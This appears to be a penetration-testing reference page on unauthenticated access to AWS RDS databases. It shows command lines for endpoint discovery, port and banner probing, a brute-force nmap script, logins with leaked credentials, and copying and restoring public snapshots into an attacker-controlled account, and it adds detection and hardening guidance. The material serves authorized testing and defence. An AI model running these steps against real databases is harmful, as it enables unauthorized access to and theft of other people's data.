---
cstg_id: CSTG-AWS-RDS-UNAUTH
title: "AWS Rds - Unauthenticated Access"
provider: aws
service: rds
phase: unauthenticated
required_access: unauthenticated
required_permissions: []
tools:
  - nmap
  - masscan
  - mysql / psql / sqlcmd / sqlplus clients
  - aws CLI (unauthenticated snapshot enumeration)
  - dnsx / amass
  - shodan / censys
references:
  - "https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.RDSSecurityGroups.html"
  - "https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_ShareSnapshot.html"
  - "https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_VPC.WorkingWithRDSInstanceinaVPC.html"
  - "https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_BestPractices.Security.html"
  - "https://hackingthe.cloud/aws/exploitation/rds_publicly_accessible/"
license: CC BY-SA 4.0
---

## Summary

Amazon Relational Database Service (RDS) provides managed relational database
engines (MySQL, MariaDB, PostgreSQL, Oracle, Microsoft SQL Server) and the
Aurora MySQL/PostgreSQL-compatible variants. Each instance or cluster is
reachable over the network through a DNS endpoint and an engine-specific TCP
port. RDS instances are frequently exposed to the internet by accident: the
`PubliclyAccessible` flag combined with an over-permissive security group, a
permissive Network ACL, or a default route to an Internet Gateway places the
database listener directly on a routable address.

From an unauthenticated, external perspective the objective is to (1) discover
RDS endpoints belonging to the target, (2) reach the listener over the network,
and (3) obtain access to data without any prior AWS credentials. The two most
common unauthenticated outcomes are direct database authentication against an
internet-exposed listener (default, weak, reused, or leaked credentials) and
restoration of a **public** RDS/Aurora snapshot that the account owner shared
with "all" AWS accounts, which exposes a full copy of the data to anyone.

This page covers what can be done with no credentials at all. Credentialed
enumeration is covered in [aws-rds-enum.md](../02-services/aws-rds-enum.md);
actions after a database or AWS-account foothold are covered in
[aws-rds-post-exploitation.md](../05-post-exploitation/aws-rds-post-exploitation.md).

## Prerequisites

- No AWS credentials are required.
- Network egress to the target's database ports from the testing host.
- The discovered target must actually be reachable: a publicly resolvable RDS
  endpoint plus a security group / NACL / route that permits inbound traffic, or
  a snapshot whose `restore` attribute lists `all`.
- For snapshot restoration, the testing party needs any AWS account (a snapshot
  shared as public can be copied/restored from any account, including a free
  one); strictly this is "unauthenticated to the target" even though the testing
  account is authenticated to AWS.

## Enumeration

### Identify candidate endpoints

RDS endpoints follow predictable hostnames. Instance endpoints take the form:

```
<db-instance-identifier>.<account-hash>.<region>.rds.amazonaws.com
```

Aurora cluster endpoints add a role qualifier:

```
<cluster-id>.cluster-<account-hash>.<region>.rds.amazonaws.com          # writer
<cluster-id>.cluster-ro-<account-hash>.<region>.rds.amazonaws.com        # reader
```

Sources for endpoint discovery without credentials:

- Passive DNS and certificate transparency: search CT logs and subdomain data
  for `*.rds.amazonaws.com` and for the target's own CNAMEs that point at RDS
  endpoints (organizations commonly create `db.example.com` CNAMEs).
- Internet scan datasets (Shodan, Censys) keyed on the open database port and
  the RDS PTR/cert metadata.
- Leaked application config: `.env`, `application.properties`, `database.yml`,
  CI logs, container images, mobile app bundles, and public Git history often
  contain the full host string, username, and password.

```bash
# Subdomain / CNAME discovery, then resolve
amass enum -passive -d example.com -o hosts.txt
dnsx -l hosts.txt -cname -resp | grep -i rds.amazonaws.com

# Certificate transparency
curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sort -u
```

### Probe the listeners

Engine-default ports:

| Engine                  | Default port |
|-------------------------|--------------|
| MySQL / MariaDB / Aurora MySQL | 3306 |
| PostgreSQL / Aurora PostgreSQL | 5432 |
| Oracle                  | 1521 |
| SQL Server              | 1433 |

```bash
# Fast reachability sweep
nmap -Pn -p 3306,5432,1433,1521 -sV --open <endpoint>

# Banner / version detail
nmap -Pn -p 3306 --script mysql-info <endpoint>
nmap -Pn -p 5432 --script pgsql-brute --script-args db=postgres <endpoint>
nmap -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info <endpoint>
```

A successful TCP handshake plus an engine banner confirms the listener is
internet-reachable. Many engines leak version and, for SQL Server, the instance
and host name before authentication.

### Enumerate public snapshots

RDS and Aurora snapshots can be shared with specific AWS account IDs or with
"all" (public). Public snapshots are visible from **any** AWS account:

```bash
# Public manual snapshots, all engines, in a region
aws rds describe-db-snapshots --include-public --snapshot-type public --region us-east-1
aws rds describe-db-cluster-snapshots --include-public --snapshot-type public --region us-east-1
```

If the target's account ID is known, filter the results to snapshots owned by
that account to find data deliberately or accidentally shared with the world.

## Misconfigurations & Findings

- **Publicly accessible instance.** `PubliclyAccessible = true` places the
  instance in a public subnet with a public IP; combined with an inbound rule
  allowing `0.0.0.0/0` on the engine port, the listener is on the open internet.
- **Over-permissive security group.** A VPC security group attached to the DB
  allowing the engine port from `0.0.0.0/0` (or a broad CIDR) regardless of the
  `PubliclyAccessible` flag, once any path into the VPC exists.
- **Public snapshot share.** A manual snapshot whose restore attribute lists
  `all`, exposing a complete, restorable copy of the database to every AWS user.
- **Weak / default / reused master credentials.** Common usernames (`admin`,
  `root`, `postgres`, `sa`, `oracle`) with weak or leaked passwords; credentials
  committed to source control or embedded in client artifacts.
- **Disabled or absent transport encryption.** Listeners accepting unencrypted
  connections, allowing credential and data capture on the path.
- **No IAM database authentication / no Kerberos**, leaving native passwords as
  the only control on an exposed listener.

## Exploitation

### Direct authentication against an exposed listener

If credentials were recovered from leaks or a configuration disclosure:

```bash
# MySQL / MariaDB / Aurora MySQL
mysql -h <endpoint> -P 3306 -u admin -p --ssl-mode=REQUIRED

# PostgreSQL / Aurora PostgreSQL
PGPASSWORD='<pw>' psql "host=<endpoint> port=5432 user=postgres dbname=postgres sslmode=require"

# SQL Server
sqlcmd -S <endpoint>,1433 -U sa -P '<pw>'

# Oracle
sqlplus system/'<pw>'@<endpoint>:1521/ORCL
```

Guessing should be rate-limited and authorized in scope; account lockout and
flooding of authentication logs are real operational impacts.

### Restore a public snapshot

A snapshot shared as public can be copied into a controlled account and restored
into a live instance, yielding the full dataset offline from the target's
controls:

```bash
# Copy the public snapshot into the controlled account/region
aws rds copy-db-snapshot \
  --source-db-snapshot-identifier arn:aws:rds:us-east-1:<owner-acct>:snapshot:<name> \
  --target-db-snapshot-identifier exfil-copy --region us-east-1

# Restore to a fresh instance under attacker control
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier exfil-db \
  --db-snapshot-identifier exfil-copy \
  --publicly-accessible --region us-east-1
```

For Aurora, use `copy-db-cluster-snapshot` then
`restore-db-cluster-from-snapshot` followed by `create-db-instance`. Once the
restored instance is available, the master password of the restored copy can be
reset by the owner of the new instance (`modify-db-instance --master-user-password`),
granting full read access to all data the original contained.

## Detection & Logging

- Network reconnaissance against the listener does not appear in CloudTrail
  (CloudTrail records AWS control-plane API calls, not raw TCP to the DB port).
  VPC Flow Logs capture the connection attempts and source addresses.
- Engine audit logs (when enabled and exported to CloudWatch Logs) record
  authentication successes and failures: the MySQL/MariaDB audit log, the
  PostgreSQL `log_connections`/`log_disconnections` output, SQL Server audit, and
  Oracle audit streams.
- **Snapshot exposure and copy are control-plane events** and DO appear in
  CloudTrail: `ModifyDBSnapshotAttribute` / `ModifyDBClusterSnapshotAttribute`
  (the act of sharing publicly), and `CopyDBSnapshot` / `RestoreDBInstanceFromDBSnapshot`
  (which appear in the *recipient* account's trail, not the owner's).
- GuardDuty surfaces anomalous login behavior against RDS via the
  RDS Protection finding family (e.g. anomalous and brute-force login findings)
  for supported Aurora and RDS engines.
- AWS Config rules (`rds-instance-public-access-check`,
  `rds-snapshots-public-prohibited`) flag the standing misconfiguration.

## Remediation & Hardening

- Set `PubliclyAccessible = false` for all production instances; place databases
  in private subnets with no route to an Internet Gateway.
- Scope security groups to specific application security groups or narrow CIDRs;
  never allow the engine port from `0.0.0.0/0`.
- Audit snapshot sharing: ensure no manual snapshot has restore attribute `all`;
  enforce with the `rds-snapshots-public-prohibited` Config rule and an SCP
  denying `rds:ModifyDBSnapshotAttribute` with `ValuesToAdd` containing `all`.
- Require TLS in transit (`rds.force_ssl`, `require_secure_transport`,
  parameter-group enforcement) and rotate the included RDS CA bundle.
- Use strong, unique master passwords stored in Secrets Manager with rotation;
  prefer IAM database authentication or Kerberos where the engine supports it.
- Remove credentials from source, images, and client bundles; scan repos and
  artifacts continuously.

## Tools

- `nmap`, `masscan` — listener discovery and engine fingerprinting.
- `amass`, `dnsx`, certificate-transparency search — endpoint discovery.
- Internet scan datasets (Shodan, Censys) — passive exposure discovery.
- Native engine clients (`mysql`, `psql`, `sqlcmd`, `sqlplus`) — authentication.
- `aws` CLI — public snapshot enumeration, copy, and restore.

## References

- AWS — RDS security groups and network access: see References frontmatter.
- AWS — Sharing a DB snapshot (public sharing semantics).
- AWS — Working with a DB instance in a VPC (public accessibility).
- AWS — RDS security best practices.
- hackingthe.cloud — Publicly accessible RDS instance.
